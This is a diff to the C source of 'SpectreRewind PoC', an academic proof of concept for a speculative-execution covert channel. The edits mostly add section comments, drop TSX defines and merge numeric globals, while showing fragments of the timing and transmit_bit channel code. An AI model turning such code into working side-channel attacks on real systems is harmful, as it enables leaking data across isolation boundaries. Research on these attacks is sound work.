@@ -1,3 +1,21 @@
+/**
+ * SpectreRewind PoC
+ *
+ * Copyright (C) 2020 Computer Systems Lab, University of Kansas.
+ *
+ * Part of library routines are from the meltdown PoC at:
+ *   https://github.com/IAIK/meltdown
+ * 
+ * This file is distributed under the GPLv2 License. 
+ */ 
+
+/**************************************************************************
+ * Conditional Compilation Options
+ **************************************************************************/
+
+/**************************************************************************
+ * Included Files
+ **************************************************************************/
 #if !defined(__aarch64__)
 #include <cpuid.h>
 #endif 
@@ -15,18 +33,28 @@
 #include <inttypes.h>
 #include <stdio.h>
 
-// ---------------------------------------------------------------------------
-static int dbg = 1;
-static volatile uint64_t counter = 0;
+/**************************************************************************
+ * Public Definitions
+ **************************************************************************/
 
+/**************************************************************************
+ * Public Types
+ **************************************************************************/
 typedef struct {
   size_t divsd_threshold; /**< threshold in cycles for the DIVSD channel */
 } libkdump_config_t;
   
+/**************************************************************************
+ * Global Variables
+ **************************************************************************/
+static int dbg = 1;
+static volatile uint64_t counter = 0;
 static libkdump_config_t config;
-
 typedef enum { ERROR, INFO, SUCCESS } d_sym_t;
 
+/**************************************************************************
+ * Public Function Prototypes
+ **************************************************************************/
 static void debug(d_sym_t symbol, const char *fmt, ...) {
   if (!dbg)
     return;
@@ -49,27 +77,6 @@ static void debug(d_sym_t symbol, const char *fmt, ...) {
   vfprintf(stdout, fmt, ap);
   va_end(ap);
 }
-
-#if defined(__aarch64__)
-#define NO_TSX 1
-#endif
-#ifndef ETIME
-#define ETIME 62
-#endif
-
-#if defined(NO_TSX) && defined(FORCE_TSX)
-#error NO_TSX and FORCE_TSX cannot be used together!
-#endif
-
-#ifndef NO_TSX
-#define _XBEGIN_STARTED (~0u)
-#endif
-
-#if defined(__i386__) && defined(FORCE_TSX)
-#undef FORCE_TSX
-#warning TSX cannot be forced on __i386__ platform, proceeding with compilation without it
-#endif
-
 
 // ---------------------------------------------------------------------------
 #if defined(__aarch64__)
@@ -103,11 +110,7 @@ static inline uint64_t rdtsc() {
 volatile char zero = 0;
 volatile char ones = 0xff;
 
-double my_number2 = 123456778910;
-double my_number3 = 12345677891;
-double my_number4 = 1234567789;
-double my_number5 = 1234567789;
-double my_number6 = 1234567789;
+double my_number = 123456778910;
 
 struct div_test
 {
@@ -157,9 +160,11 @@ int __attribute__ ((noinline)) transmit_bit( struct div_test * dt, int bit_no )
 {
   double recv_num = dt->number;
   double div = dt->div;
-  double send1 = my_number2, send2 = my_number3, send3 = my_number4, send4 = my_number5;
+  double send1, send2, send3, send4;
   volatile char *ptr = dt->addr;
 
+  send1 = send2 = send3 = send4 = my_number;
+  
   // receiver: control the speculation window size
   for (int i = 0; i < N_DIVS; i++) {
     recv_num /= div;
